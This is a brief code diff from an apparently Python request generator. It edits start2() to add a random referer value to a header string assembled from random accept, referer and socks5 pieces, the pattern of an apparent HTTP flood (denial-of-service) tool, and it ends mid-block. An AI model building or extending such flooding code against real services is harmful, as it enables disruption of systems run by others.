@@ -140,7 +140,7 @@ def start2():
   byte4 = random.choice(acceptall)+random.choice(ref)
   reef = random.choice(ref)
   acceppt = random.choice(socks5)+random.choice(acceptall)+random.choice(ref)+"\r\n"
-  byte_host = byte3 + byte4 + acceppt + "\r\n"
+  byte_host = byte3 + byte4 + reef + acceppt + "\r\n"
   return byte_host
   while True:
             try:
